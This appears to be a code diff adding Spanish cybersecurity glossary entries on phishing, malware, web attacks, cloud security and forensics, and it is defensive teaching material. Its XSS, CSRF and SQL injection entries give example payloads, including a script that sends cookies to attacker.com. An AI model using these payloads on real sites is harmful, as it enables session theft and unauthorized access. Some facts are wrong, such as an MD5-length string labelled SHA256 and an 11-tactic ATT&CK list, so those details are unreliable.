@@ -9255,6 +9255,545 @@ export const DEFINITIONS: ConceptDefinition[] = [
     ],
     related: ["Proceso de auditoría", "ISO 27001, SGSI y SoA", "Gobernanza de seguridad"],
   },
+
+  // ── M34 · Ingeniería Social y Phishing ──────────────────────────────────
+  {
+    id: 376,
+    module: 34,
+    term: "Ingeniería Social",
+    short: "Manipulación psicológica para explotar la naturaleza social humana y revelar información sensible.",
+    detail:
+      "La **ingeniería social** es la explotación de la **psicología humana** en vez de vulnerabilidades técnicas. Es más efectiva porque **el factor humano es impredecible**. Principios clave:\n" +
+      "• **Confianza** — el atacante se gana la credibilidad fingiendo ser alguien de autoridad, colegas o soporte.\n" +
+      "• **Urgencia** — crea presión de tiempo (\"tu cuenta será bloqueada en 1 hora\").\n" +
+      "• **Miedo** — toca temas emocionales (pérdida de datos, castigo, fraude).\n" +
+      "• **Reciprocidad** — \"si te ayudo, me ayudas\"; el atacante ofrece algo primero.\n" +
+      "> ⚠️ No hay firewall que defienda contra la manipulación. La defensa es **conciencia y formación**.",
+    examples: [
+      "Llamar suplantando IT: \"necesito verificar tu contraseña por seguridad\".",
+      "Email fingiendo ser el director: \"transfiere dinero para pagar una factura urgente\".",
+      "USB plantado en el parking con etiqueta \"salarios 2025\".",
+    ],
+    related: ["Phishing", "Pretexting", "Principios de seguridad humana"],
+  },
+  {
+    id: 377,
+    module: 34,
+    term: "Phishing",
+    short: "Ataque por email/SMS/web que suplanta una entidad de confianza para robar credenciales o datos.",
+    detail:
+      "**Phishing** = **fishing** (pesca) con anzuelo cibernetico. El atacante lanza un email masivo esperando que alguien pique. Tipos:\n" +
+      "| Tipo | Blanco | Técnica |\n" +
+      "|---|---|---|\n" +
+      "| Phishing (masivo) | Usuarios genéricos | Email fake de banco / PayPal / Google |\n" +
+      "| Spearphishing | Objetivo específico | Email personalizado al gerente de finanzas |\n" +
+      "| Whaling | C-suite (CEO, CFO) | Email de confianza (junta directiva) pidiendo transferencia |\n" +
+      "| Smishing | SMS | \"Tu tarjeta fue comprometida. Haz clic aquí\" |\n" +
+      "| Vishing | Llamada telefónica | \"Soy del banco, verifica tu PIN\" |\n" +
+      "> 💡 El **indicador técnico clave** es la URL: verifica el dominio real en la barra de direcciones, no en el texto del link.",
+    examples: [
+      "Email falso de Amazon solicitando \"re-validar tu contraseña\".",
+      "SMS de un operador: \"Debes pagar una factura. Entra en este enlace\" → URL falsa.",
+      "Whaling: Email que suplanta al CEO pidiendo pagos urgentes (BEC scam).",
+    ],
+    related: ["Ingeniería Social", "Indicadores de compromiso", "Defensa contra phishing"],
+  },
+  {
+    id: 378,
+    module: 34,
+    term: "Pretexting",
+    short: "Crear una historia ficticia convincente (pretexto) para ganar confianza y acceder a información.",
+    detail:
+      "**Pretexting** es la creación de un **escenario falso** que suena creíble. No es masivo (phishing) sino dirigido. Ejemplos clásicos:\n" +
+      "• \"Soy del IT support, tu máquina tiene un virus.\"\\n" +
+      "• \"Soy del banco, necesito verificar algunos datos.\"\\n" +
+      "• \"Soy un nuevo empleado en finanzas, ¿cómo se solicitan reportes?\"\\n" +
+      "La clave es que el **pretexto es situacionalmente creíble** — usa jerga interna, nombres reales de departamentos, etc. Se recopila este **OSINT** previo del objetivo.",
+    examples: [
+      "Llamar suplantando a un colega para pedir acceso a una carpeta compartida.",
+      "Email desde un email falso pero similar al del proveedor de la empresa.",
+    ],
+    related: ["Ingeniería Social", "OSINT", "Recopilación de información"],
+  },
+  {
+    id: 379,
+    module: 34,
+    term: "Ataques de credenciales",
+    short: "Robo, adivinanza o reutilización de credenciales para acceder a cuentas.",
+    detail:
+      "El **acceso a credenciales válidas** es la entrada más común (post-breach): \n" +
+      "• **Credential stuffing** — intenta credenciales (user:pass) de un breach previo en otro sitio.\n" +
+      "• **Fuerza bruta** — itera contraseñas comunes (123456, password, etc.).\n" +
+      "• **Reutilización de credenciales** — mismo usuario y pass en múltiples sitios.\n" +
+      "• **Obtención via phishing** — el usuario es engañado y entra su credencial en un sitio falso.\n" +
+      "> ⚠️ El 81% de violaciones involucran **credenciales débiles o reutilizadas** (Verizon DBIR 2023).",
+    examples: [
+      "LinkedIn breach (600M) expone user:pass, atacante intenta en Gmail con mismo combo.",
+      "Diccionario masivo de 10M contraseñas comunes contra un servidor SSH abierto.",
+      "Email phishing fingiendo Office 365, usuario entra credenciales que se capturan.",
+    ],
+    related: ["Phishing", "Gestión de contraseñas", "Autenticación multifactor"],
+  },
+
+  // ── M35 · Análisis de Malware ──────────────────────────────────────────
+  {
+    id: 386,
+    module: 35,
+    term: "Malware",
+    short: "Software malicioso diseñado para dañar, espiar, controlar o extraer datos.",
+    detail:
+      "**Malware** = **malicious software**. Categorías por **intención**:\n" +
+      "| Tipo | Intención | Ejemplos |\n" +
+      "|---|---|---|\n" +
+      "| Virus | Reproducción destructiva | Borra archivos, corrompe boot |\n" +
+      "| Gusano | Autorreplicación en red | Conficker, Morris worm |\n" +
+      "| Troyano | Acceso remoto / backdoor | Trickbot (banking), RAT |\n" +
+      "| Ransomware | Cifra datos y extorsión | Wannacry, REvil |\n" +
+      "| Spyware | Vigilancia silenciosa | Keylogger, screenshot stealer |\n" +
+      "| Adware | Publicidad invasiva / rastreo | Browser hijack |\n" +
+      "| Rootkit | Acceso privilegiado persistente | Kernel-mode trojan |\n" +
+      "| Botnet | Control remoto masivo | Mirai, Zeus |\n" +
+      "> 💡 Un malware puede ser **polimorfo** (cambia su código) o **metamórfico** (reescribe su estructura).",
+    examples: [
+      "Ransomware LockBit cifra archivos empresariales y pide $2M rescate.",
+      "RAT Agent Tesla instalado via correo → keylogger + credential stealer.",
+    ],
+    related: ["Análisis estático vs dinámico", "Indicadores de compromiso", "Respuesta ante incidentes"],
+  },
+  {
+    id: 387,
+    module: 35,
+    term: "Análisis estático vs dinámico",
+    short: "Estático: examina el archivo sin ejecutarlo (reverse engineer). Dinámico: ejecuta y monitorea comportamiento.",
+    detail:
+      "**Análisis estático**:\n" +
+      "• Lee bytecode / ensamblador sin ejecutar.\n" +
+      "• Herramientas: IDA Pro, Ghidra, objdump, strings.\n" +
+      "• Ventajas: seguro, rápido, detalla la lógica completa.\n" +
+      "• Desventajas: código ofuscado / empaquetado es opaco; no detecta comportamiento de runtime.\n" +
+      "\\n**Análisis dinámico**:\n" +
+      "• Ejecuta el malware en sandbox aislado y observa syscalls, red, filesystem.\n" +
+      "• Herramientas: Wireshark, ProcMon, Cuckoo, Any.run.\n" +
+      "• Ventajas: revela comportamiento real, detecta técnicas anti-análisis.\n" +
+      "• Desventajas: el malware puede detectar sandbox y no ejecutar; requiere entorno seguro.\n" +
+      "> 💡 **Análisis híbrido**: primero estático (rápido), si es sospechoso luego dinámico (detalle).",
+    examples: [
+      "IDA Pro desensambla un RAT y muestra direcciones C2 en strings.",
+      "Cuckoo ejecuta malware y captura 47 procesos spawned + intentos de conexión a IP maliciosa.",
+    ],
+    related: ["Malware", "Sandboxing", "Indicadores de compromiso"],
+  },
+  {
+    id: 388,
+    module: 35,
+    term: "Empaquetado y ofuscación",
+    short: "Técnicas de anti-análisis que ocultan el código: comprime, cifra o ofusca el ejecutable.",
+    detail:
+      "Atacantes usan estas técnicas para evadir **análisis estático y antivirus**:\n" +
+      "• **Empaquetado** — comprime el binario original bajo un stub decompressor (UPX, ASPack). El código original **no es visible** hasta runtime.\n" +
+      "• **Ofuscación** — reescribe código de forma lógicamente equivalente pero incomprehensible (variables renombradas, saltos condicionales absurdos).\n" +
+      "• **Cifrado** — cifra el payload y lo descifra en memoria en runtime.\n" +
+      "• **Anti-debugging** — detecta si está siendo debuggeado (IsDebuggerPresent, trap flags) y se autodestruye.\n" +
+      "> ⚠️ El análisis **estático** falla. Requiere **desenpacar en memoria** (volcar la memoria durante ejecución en sandbox) o **dynamic hooking** de syscalls.",
+    examples: [
+      "UPX empaquetar un troyan: el archivo pesa 50 KB empaquetado, 500 KB una vez desempaquetado.",
+      "Emotet ofusca su código C2 communication: al análisis estático se ve ilegible, pero en runtime decrypta y envia datos.",
+    ],
+    related: ["Análisis estático vs dinámico", "Detección de malware", "Ingeniería inversa"],
+  },
+  {
+    id: 389,
+    module: 35,
+    term: "Indicadores de compromiso (IOC)",
+    short: "Artefactos técnicos que evidencian la presencia de malware o actividad maliciosa.",
+    detail:
+      "Un **IOC** es una **pista digital** que permite detectar un incidente:\n" +
+      "| IOC | Ejemplos |\n" +
+      "|---|---|\n" +
+      "| Hash | MD5/SHA1/SHA256 del malware |\n" +
+      "| IP/Dominio | Dirección C2 (command & control) |\n" +
+      "| URL | Servidor de payload / exfiltración |\n" +
+      "| Comportamiento | Creación de reg. de persistencia, conexión a puerto X |\n" +
+      "| Mutantes | Rutas de fichero, procesos, mutex que usa el malware |\n" +
+      "| YARA rule | Regla que matchea patrones del código |\n" +
+      "> 💡 IOCs **públicos** (de incidentes previos) alimentan antivirus y SIEM. Los **privados** (de tu red) son oro para forensics.",
+    examples: [
+      "Hash SHA256: 5d41402abc4b2a76b9719d911017c592 → VirusTotal: 58/70 detectores positivos.",
+      "Dominio C2: evil.ru — agregarlo a firewall + DNS sinkhole bloquea comunicación malware.",
+    ],
+    related: ["Análisis de malware", "Threat intelligence", "Threat hunting"],
+  },
+
+  // ── M36 · Seguridad en Aplicaciones Web ──────────────────────────────────
+  {
+    id: 395,
+    module: 36,
+    term: "OWASP Top 10",
+    short: "Clasificación de los 10 riesgos de seguridad más críticos en aplicaciones web.",
+    detail:
+      "OWASP (Open Web Application Security Project) publica cada 3-4 años un ranking de amenazas reales. **Top 10 2021** (vigente):\n" +
+      "1. **Broken Access Control** — falta de validación de permisos; un usuario accede a datos de otro.\n" +
+      "2. **Cryptographic Failures** — datos sensibles expuestos (sin cifrado, protocolos débiles).\n" +
+      "3. **Injection** — SQLi, XML, LDAP; entrada no sanitizada permite inyectar código.\n" +
+      "4. **Insecure Design** — arquitectura sin defensas (sin rate limiting, sin validación).\n" +
+      "5. **Security Misconfiguration** — default credentials, servicios innecesarios, información sensible expuesta.\n" +
+      "6. **Vulnerable Components** — uso de librerías obsoletas con CVEs.\n" +
+      "7. **Authentication Failures** — credenciales débiles, sesión insegura, MFA ausente.\n" +
+      "8. **Data Integrity Failures** — CI/CD comprometida, sin validación de signatures.\n" +
+      "9. **Logging & Monitoring Failures** — ausencia de logs; no se detectan incidentes.\n" +
+      "10. **SSRF (Server-Side Request Forgery)** — servidor hace request a URL atacante-controlada.\n" +
+      "> 💡 El 94% de incidentes involucran temas del OWASP Top 10.",
+    examples: [
+      "M1: Cambiar ?user=123 a ?user=456 accede a otro perfil.",
+      "M3: Login form vulnerable a SQLi: admin' OR '1'='1.",
+    ],
+    related: ["SQLi", "XSS", "CSRF", "Validación de entrada"],
+  },
+  {
+    id: 396,
+    module: 36,
+    term: "SQL Injection (SQLi)",
+    short: "Insertar código SQL malicioso en un campo de entrada para ejecutar queries no autorizadas.",
+    detail:
+      "**SQLi** es el ataque **M3** del OWASP Top 10. Ocurre cuando la aplicación **concatena entrada del usuario directamente en una query SQL**:\n" +
+      "```sql\n" +
+      "query = \"SELECT * FROM users WHERE username='\" + user_input + \"' AND password='\" + pass_input + \"'\";\n" +
+      "```\n" +
+      "Si user_input = `admin' --`, la query se convierte en:\n" +
+      "```sql\n" +
+      "SELECT * FROM users WHERE username='admin' --' AND password='...';\n" +
+      "```\n" +
+      "El `--` comenta el resto, saltando la validación de contraseña. **Defensa**:\n" +
+      "• **Prepared Statements** — separar SQL de datos (parámetros vinculados).\n" +
+      "• **ORM** — abstracción que valida automáticamente.\n" +
+      "• **WAF** — detección de patrones SQLi (signatures).\n" +
+      "• **Validación de entrada** — whitelist de caracteres permitidos.",
+    examples: [
+      "Login: username = `' OR '1'='1` → acceso sin contraseña.",
+      "Union-based SQLi: `UNION SELECT table_name FROM information_schema.tables` → enumerar BD.",
+    ],
+    related: ["Validación de entrada", "Inyección de código", "WAF (Web Application Firewall)"],
+  },
+  {
+    id: 397,
+    module: 36,
+    term: "Cross-Site Scripting (XSS)",
+    short: "Inyectar código JavaScript malicioso en una página web para ejecutar en el navegador del usuario.",
+    detail:
+      "**XSS** es la inyección de **script client-side** en una página. Tipos:\n" +
+      "| Tipo | Mecanismo | Impacto |\n" +
+      "|---|---|---|\n" +
+      "| Reflected | ?param=<script>alert(1)</script> → el servidor refleja el input en HTML | Cookie/session stealer |\n" +
+      "| Stored | Input malicioso guardado en BD → afecta a **todos** los que visiten | Worm, trojan, cuenta hijack |\n" +
+      "| DOM | JavaScript manipula el DOM mal validando entrada | Similar a Reflected |\n" +
+      "El **DOM XSS** es moderno: `document.innerHTML = userInput` sin sanitizar permite inyectar tags.\n" +
+      "**Defensa**:\n" +
+      "• **Sanitización** — remove tags peligrosos (<script>, event handlers).\n" +
+      "• **Encoding** — `<` → `&lt;`, `>` → `&gt;`.\n" +
+      "• **Content Security Policy (CSP)** — header que dice qué scripts son permitidos.\n" +
+      "• **Validación servidor-side** — NUNCA confíes en el cliente.",
+    examples: [
+      "Searched for: <img src=x onerror=alert('XSS')> → alerta en todos los resultados.",
+      "Stored XSS en comentario de blog: <script>fetch('https://attacker.com?cookie=' + document.cookie)</script>.",
+    ],
+    related: ["Validación de entrada", "Content Security Policy", "OWASP Top 10"],
+  },
+  {
+    id: 398,
+    module: 36,
+    term: "Cross-Site Request Forgery (CSRF)",
+    short: "Forzar a un usuario autenticado a ejecutar acciones no deseadas sin su consentimiento.",
+    detail:
+      "**CSRF** explota el hecho de que el navegador envía **cookies automáticamente** con cada request al mismo dominio:\n" +
+      "1. Usuario autenticado en bank.com (cookie de sesión almacenada).\n" +
+      "2. Usuario **sin cerrar sesión** visita evil.com.\n" +
+      "3. evil.com contiene: `<img src='https://bank.com/transfer?to=attacker&amount=1000'>`\n" +
+      "4. El navegador **automáticamente** envía la cookie, ejecutando la transferencia.\n" +
+      "**Defensa**:\n" +
+      "• **CSRF token** — servidor genera un token único por sesión, incluido en cada form. Si el token es inválido, rechaza.\n" +
+      "• **SameSite cookie** — atributo que previene que cookies se envíen en requests cross-site.\n" +
+      "• **Double Submit cookie** — compara token en cookie vs token en form.\n" +
+      "• **Validar Referer header** — acepta solo requests de tu dominio.",
+    examples: [
+      "Email con <img>: \"Haz clic para ver tu facturas\" → en realidad ejecuta una DELETE del perfil.",
+      "Sitio invasivo con 1x1 pixel que intenta cambiar contraseña en un router comprometido.",
+    ],
+    related: ["Validación de entrada", "Seguridad de sesión", "CsrfBridge (AlphaLog)"],
+  },
+  {
+    id: 399,
+    module: 36,
+    term: "Validación de entrada",
+    short: "Verificar que los datos ingresados por el usuario sean válidos antes de procesarlos.",
+    detail:
+      "La **validación de entrada** es la **primera línea de defensa** contra inyección de código. Estrategia:\n" +
+      "1. **Whitelist (preferida)** — solo aceptar caracteres/formatos conocidos (ej: email debe tener @).\n" +
+      "2. **Blacklist** — rechazar patrones maliciosos (ej: rechazar <script>). ❌ Insuficiente (evasión).\n" +
+      "3. **Normalización** — convertir entrada a forma canónica (ej: trim, lowercase).\n" +
+      "4. **Escaping/Encoding** — transformar caracteres especiales (ej: < → &lt;).\n" +
+      "5. **Longitud máxima** — prevenir buffer overflow / DoS (millones de caracteres).\n" +
+      "> ⚠️ **Validación servidor-side es mandatoria**. La cliente (JavaScript) se puede bypassear.",
+    examples: [
+      "Email: validar con regex `/^[^@]+@[^@]+\\.[^@]+$/`.",
+      "Password: mínimo 12 caracteres, mayús + minús + número + special char.",
+      "Archivo subido: verificar extensión (jpg/png), tamaño (<5MB), mime type.",
+    ],
+    related: ["OWASP Top 10", "SQLi", "XSS", "Sanitización"],
+  },
+
+  // ── M37 · Seguridad en la Nube ──────────────────────────────────────────
+  {
+    id: 405,
+    module: 37,
+    term: "Cloud Security",
+    short: "Proteger datos y aplicaciones en infraestructuras en la nube (AWS, Azure, GCP).",
+    detail:
+      "La nube traslada la **responsabilidad** pero no elimina el **riesgo**. Modelo de **responsabilidad compartida**:\n" +
+      "| Responsabilidad | SaaS | PaaS | IaaS | On-Prem |\n" +
+      "|---|---|---|---|---|\n" +
+      "| Red | ☁️ Proveedor | ☁️ Proveedor | 🏢 Cliente | 🏢 Cliente |\n" +
+      "| Computación | ☁️ Proveedor | ☁️ Proveedor | 🏢 Cliente | 🏢 Cliente |\n" +
+      "| Datos | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente |\n" +
+      "| Acceso/Identidad | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente | 🏢 Cliente |\n" +
+      "**Riesgos clave de nube**:\n" +
+      "• Configuración errónea de buckets S3 / blobs (público por accidente).\n" +
+      "• IAM débil — demasiados permisos, credenciales hardcodeadas.\n" +
+      "• Datos sin cifrar en tránsito o en reposo.\n" +
+      "• Lateral movement entre instancias / workspaces.\n" +
+      "> 💡 El 94% de breaches en nube fueron por error de configuración, no zero-day.",
+    examples: [
+      "Bucket S3 configurado como público → 165M registros de PII expuestos (Capital One 2019).",
+      "Clave AWS commitida en GitHub → acceso a toda la infraestructura.",
+    ],
+    related: ["IAM (Identity and Access Management)", "Encriptación en tránsito vs reposo", "Compliance en la nube"],
+  },
+  {
+    id: 406,
+    module: 37,
+    term: "IAM (Identity and Access Management)",
+    short: "Sistema para autenticar usuarios y autorizar qué recursos pueden acceder.",
+    detail:
+      "**IAM** es la **columna vertebral** del control de acceso en cualquier infraestructura. Componentes:\n" +
+      "• **Autenticación** — \"eres quién dices ser\" (credenciales, MFA, biometría).\n" +
+      "• **Autorización** — \"tienes permiso para esta acción\" (roles, políticas).\n" +
+      "• **Auditoría** — \"quién accedió a qué, cuándo\" (logs de acceso).\n" +
+      "**Principios clave**:\n" +
+      "1. **Mínimo privilegio** — cada usuario solo accede a lo que necesita.\n" +
+      "2. **Separación de funciones** — el que aprueba compras ≠ el que las realiza.\n" +
+      "3. **Revocación de acceso** — cuando se va un empleado, remover permisos **inmediatamente**.\n" +
+      "4. **Rotación de credenciales** — cambiar contraseñas / keys regularmente.\n" +
+      "> ⚠️ El **acceso sobreprivilegiado** (privilegio que no se usa) es deuda técnica = riesgo real.",
+    examples: [
+      "AWS IAM policy: `Principal: *, Action: *, Resource: *` = desastre; restringir a ARNs específicos.",
+      "Service account con key de 5 años sin rotación → compromiso persiste.",
+    ],
+    related: ["Autenticación", "RBAC (Role-Based Access Control)", "Principio de mínimo privilegio"],
+  },
+  {
+    id: 407,
+    module: 37,
+    term: "Encriptación en tránsito vs reposo",
+    short: "Tránsito: datos en movimiento (TLS). Reposo: datos almacenados (AES, RSA).",
+    detail:
+      "Los datos tienen **dos estados** de riesgo:\n" +
+      "\\n**En tránsito** (moving):\n" +
+      "• TLS/SSL — encripta comunicación cliente-servidor.\n" +
+      "• Certificados — autentica identidad del servidor (evita MITM).\n" +
+      "• PFS (Perfect Forward Secrecy) — sesiones independientes, rotura de una key no afecta otras.\n" +
+      "\\n**En reposo** (storage):\n" +
+      "• AES-256 (simétrica) — cifra archivos, BD, backups.\n" +
+      "• RSA (asimétrica) — cifra keys, firma documentos.\n" +
+      "• Key rotation — cambiar keys criptográficas periódicamente.\n" +
+      "• Escrow / Cold storage — backups cifrados offsite.\n" +
+      "> ⚠️ Datos sin encriptar en reposo son accesibles si alguien roba el servidor / disco.",
+    examples: [
+      "HTTPS (TLS) en todas las páginas → tránsito seguro.",
+      "Contraseñas hasheadas (bcrypt) en BD → incluso si roban la BD, no recuperan plain-text.",
+      "Backup cifrado con AES-256 + key guardada en HSM aparte.",
+    ],
+    related: ["Criptografía", "TLS/SSL", "Gestión de claves", "PFS"],
+  },
+  {
+    id: 408,
+    module: 37,
+    term: "Compliance en la nube",
+    short: "Cumplimiento normativo: GDPR, HIPAA, PCI-DSS, SOC 2, ISO 27001 en entornos cloud.",
+    detail:
+      "Regulaciones imponen requisitos sobre **dónde** y **cómo** se almacenan datos:\n" +
+      "| Marco | Aplicable | Requisitos clave |\n" +
+      "|---|---|---|\n" +
+      "| **GDPR** | UE | Datos personales cifrados, derecho al olvido, consentimiento explícito |\n" +
+      "| **HIPAA** | Salud (USA) | Datos médicos cifrados, auditoría, acceso limitado |\n" +
+      "| **PCI-DSS** | Tarjetas de crédito | Cardholder data environment aislado, tokenización |\n" +
+      "| **SOC 2** | SaaS vendors | Controles de seguridad verificados por auditor externo |\n" +
+      "| **ISO 27001** | General | SGSI completo: políticas, riesgos, tratamientos, auditoría |\n" +
+      "**Desafío en nube**: multi-tenancy — tus datos pueden estar en el mismo servidor que datos de un competidor. Mitigación: cifrado client-side + segregación de network.",
+    examples: [
+      "GDPR: usuario de EU solicita derecho al olvido → eliminar todos sus datos en 30 días.",
+      "PCI-DSS: no almacenar CVV en BD; usar tokenización de PCI-compliant processor.",
+    ],
+    related: ["Gestión de riesgos", "Auditoría y compliance", "Privacidad de datos"],
+  },
+  {
+    id: 409,
+    module: 37,
+    term: "Identidad federada y SSO",
+    short: "Un único login (IdP central) para acceder a múltiples aplicaciones.",
+    detail:
+      "**SSO (Single Sign-On)** permite autenticarse una sola vez:\n" +
+      "1. Usuario abre app A; es redirigido a IdP (Google, Okta, Azure AD).\n" +
+      "2. Entra credenciales en IdP.\n" +
+      "3. IdP genera un token (SAML, OpenID Connect, OAuth 2.0).\n" +
+      "4. App A acepta token y concede acceso.\n" +
+      "5. Usuario abre app B → ya tiene token, acceso instantáneo.\n" +
+      "**Ventajas**: gestión centralizada, MFA en un solo lugar, auditoría unificada.\n" +
+      "**Riesgos**: si el IdP se compromete, todos los apps están comprometidos. **Defensa**: MFA en IdP, monitoreo de anomalías.",
+    examples: [
+      "Google Sign-in: inicio en Gmail y acceso automático a YouTube, Drive, Photos.",
+      "Okta como IdP empresarial: emplea entra MFA, accede a Jira, Salesforce, Slack en una sesión.",
+    ],
+    related: ["Autenticación", "MFA", "OAuth 2.0 y OpenID Connect", "Zero Trust"],
+  },
+
+  // ── M38 · Respuesta a Incidentes y Análisis Forense ────────────────────
+  {
+    id: 414,
+    module: 38,
+    term: "Respuesta a Incidentes (IR)",
+    short: "Proceso estructurado para contener, erradicar y recuperarse de un evento de seguridad.",
+    detail:
+      "Un **incidente** es un evento que **compromete la confidencialidad, integridad o disponibilidad** de la información. Fases del **IR**:\n" +
+      "\\n1. **Preparación** — políticas, herramientas, equipo entrenado, respuesta pre-plan.\n" +
+      "2. **Identificación** — detección de anormalías (alertas SIEM, reportes de usuarios, pruebas).\n" +
+      "3. **Contención**:\n" +
+      "   - Corto plazo: aislar el sistema comprometido de la red (kill the connection).\n" +
+      "   - Largo plazo: parcheado, cambio de credenciales, reglas firewall.\n" +
+      "4. **Erradicación** — remover el malware, cerrar la puerta de entrada (patch vulnerabilidad).\n" +
+      "5. **Recuperación** — restaurar sistemas a estado limpio, validar estabilidad.\n" +
+      "6. **Análisis post-incidente** — **lecciones aprendidas**, mejorar controles.\n" +
+      "> ⚠️ El tiempo es vida en IR: cada minuto de downtime o exfiltración cuenta.",
+    examples: [
+      "Phishing → delivery de payload → detección en 3 horas → aislamiento 5 horas → recuperación 24 horas.",
+      "Breach no detectado en meses: inicio 2023-01-15, descobrimiento 2023-06-30 = 166 días de exposición.",
+    ],
+    related: ["Investigación forense", "Indicadores de compromiso", "Plan de continuidad"],
+  },
+  {
+    id: 415,
+    module: 38,
+    term: "Investigación forense",
+    short: "Análisis detallado de un incidente para determinar qué, cómo, cuándo y quién.",
+    detail:
+      "**Forensics** = recopilación y análisis de **evidencia digital** de forma científica, preservando **cadena de custodia**:\n" +
+      "\\n**Cadena de custodia**: registro de quién tocó la evidencia, cuándo y por qué. Romper la cadena invalida la prueba legalmente.\n" +
+      "\\n**Artefactos forenses** (Windows):\n" +
+      "• **Event Logs** (3 de ellos: Security, System, Application) → quién loggeó, errores, cambios.\n" +
+      "• **MFT (Master File Table)** → info de ficheros (tiempos, tamaños, clusters).\n" +
+      "• **Prefetch / RecentApps** → qué programas se ejecutaron.\n" +
+      "• **Registro Windows** → configuración, instalaciones, conexiones red, MRU (most recently used).\n" +
+      "• **Memory dump** → procesos activos, credenciales en RAM, conexiones activas.\n" +
+      "\\n**Herramientas**: EnCase, FTK, Volatility (memory), Wireshark (network pcaps).",
+    examples: [
+      "Event Log: UserA loggeó a las 02:30 (hora rara), ejecutó cmd.exe, cambió contraseña administrador.",
+      "Memory dump: proceso svchost.exe contiene URL a C2, credenciales en plain-text.",
+    ],
+    related: ["Respuesta a incidentes", "Análisis de malware", "Evidencia digital"],
+  },
+  {
+    id: 416,
+    module: 38,
+    term: "Cadena de custodia",
+    short: "Documentación rigurosa de quién, cuándo, dónde y por qué se manipuló evidencia digital.",
+    detail:
+      "La **cadena de custodia** es crítica para **viabilidad legal** de la evidencia. Requisitos:\n" +
+      "• **Integridad** — la evidencia no fue modificada (hash criptográfico pre/post).\n" +
+      "• **Autenticidad** — es real (firmado criptográficamente, testigos).\n" +
+      "• **Trazabilidad** — cada persona que tocó la evidencia está registrada.\n" +
+      "\\n**En práctica**:\n" +
+      "1. Clonar disco con herramienta forense (crea imagen, verifica hash MD5/SHA256).\n" +
+      "2. Documentar: quién clonó, cuándo, dónde, por qué, tool versión, hash.\n" +
+      "3. Sellar físicamente (tamper tape) y digitalmente (firma criptográfica).\n" +
+      "4. Cada acceso posterior: registrar en acta de custodia.\n" +
+      "5. En juicio, demostrar que nadie más tocó la evidencia.",
+    examples: [
+      "Disk clonado con WriteBlocker + Encase: hash original SHA256 = ABC123... verificado en audit.\n" +
+      "Si alguien toca el disco sin registro, la defensa puede argumentar contaminación y se desestima la evidencia.",
+    ],
+    related: ["Investigación forense", "Estándares forenses", "Admisibilidad en juicio"],
+  },
+  {
+    id: 417,
+    module: 38,
+    term: "MITRE ATT&CK Framework",
+    short: "Catálogo de técnicas y tácticas reales de atacantes, organizado por objetivo (recon, execution, etc).",
+    detail:
+      "**MITRE ATT&CK** es el **equivalente ofensivo del NIST Cybersecurity Framework**. Organiza ataques por **tácticas** (qué quiere) y **técnicas** (cómo lo logra):\n" +
+      "\\n**11 Tácticas principales**:\n" +
+      "1. **Reconnaissance** — recopila info previa (OSINT, scanning).\n" +
+      "2. **Resource Development** — compra dominios, infraestructura.\n" +
+      "3. **Initial Access** — entra (phishing, vuln exploit, supply chain).\n" +
+      "4. **Execution** — ejecuta código (script, command, malware).\n" +
+      "5. **Persistence** — queda residente (backdoor, cron job, startup).\n" +
+      "6. **Privilege Escalation** — obtiene admin.\n" +
+      "7. **Defense Evasion** — evade detección (ofuscación, living-off-the-land).\n" +
+      "8. **Credential Access** — roba credenciales.\n" +
+      "9. **Discovery** — mapea la red interna.\n" +
+      "10. **Lateral Movement** — salta a otros sistemas.\n" +
+      "11. **Exfiltration** — extrae datos.\n" +
+      "> 💡 Mapear un incidente contra ATT&CK: \"el atacante usó T1566.002 (phishing con attachment)\", facilita comunicación y defensa.",
+    examples: [
+      "APT28 (Fancy Bear) típicamente usa T1071.001 (Application Layer Protocol) para C2.",
+      "Ransomware Ryuk: recon (T1592) → lateral movement (T1570) → exfil (T1537) → encrypt (T1486).",
+    ],
+    related: ["Respuesta a incidentes", "Threat intelligence", "Threat hunting"],
+  },
+  {
+    id: 418,
+    module: 38,
+    term: "Threat Hunting",
+    short: "Búsqueda proactiva de indicios de compromiso antes de que afecten la operación.",
+    detail:
+      "**Threat hunting** = **detective criminalístico en tu red**. No esperas a que alertas salten; buscas activamente:\n" +
+      "\\n**Proceso**:\n" +
+      "1. **Hipótesis** — \"un atacante podría estar aquí porque...\" (basada en inteligencia, vulnerabilidades, industria).\n" +
+      "2. **Investigación** — query logs (SIEM), network pcaps (Zeek), endpoint telemetry (EDR).\n" +
+      "3. **Validación** — ¿es real o falso positivo? (correlaciona con múltiples fuentes).\n" +
+      "4. **Contención** — si es real, aislamiento inmediato.\n" +
+      "5. **Análisis** — ¿qué más compromete? ¿cuánto tiempo estuvo?\n" +
+      "\\n**Indicios a buscar**:\n" +
+      "• Outbound DNS a dominios new/rare (DGA botnets).\n" +
+      "• PowerShell suspicious (obfuscated, downloading, encoding).\n" +
+      "• Conexiones a puertos no-standard (C2 alternativo).\n" +
+      "• Cambios en SAM/NTDS (crack de credenciales offline).\n" +
+      "• Share enumerations / lateral pass-the-hash.",
+    examples: [
+      "Query SIEM: todos los DNS a dominios .ru de hosts que no deberían resolver externos.",
+      "EDR alert: proceso hijo de svchost.exe corriendo powershell (anomalía, típico malware).",
+    ],
+    related: ["Respuesta a incidentes", "SIEM", "Indicadores de compromiso"],
+  },
+  {
+    id: 419,
+    module: 38,
+    term: "Plan de continuidad y recuperación",
+    short: "Estrategia de backup, failover y recuperación para minimizar downtime e impacto de desastres.",
+    detail:
+      "**Continuidad** = negocio sigue funcionando. **Recuperación** = vuelve a normal. Métricas:\n" +
+      "• **RTO (Recovery Time Objective)** — tiempo máximo tolerable de downtime. ej: 4 horas.\n" +
+      "• **RPO (Recovery Point Objective)** — cantidad máxima de datos que podemos perder. ej: 1 hora de datos.\n" +
+      "\\n**Estrategias**:\n" +
+      "| | Backup | Failover | Geo-redundancia |\n" +
+      "|---|---|---|---|\n" +
+      "| **Costo** | Bajo | Medio-alto | Alto |\n" +
+      "| **RTO** | Horas-días | Minutos | Segundos |\n" +
+      "| **RPO** | Horas | Minutos | Segundos |\n" +
+      "\\n**Pruebas**: **DR drill anual** (apaga todo y ve si recuperas). No es teoría — es práctica.",
+    examples: [
+      "BCP: si datacenter USA se cae, failover a réplica en EU (RPO=0, RTO=30s).",
+      "Ransomware: restaurar desde backup de 24h atrás (RPO=24h, RTO=2-4h según tamaño).",
+    ],
+    related: ["Backup y archivado", "Resiliencia", "Gestión de riesgos"],
+  },
 ];
 
 export function definitionsByModule(moduleId: number): ConceptDefinition[] {
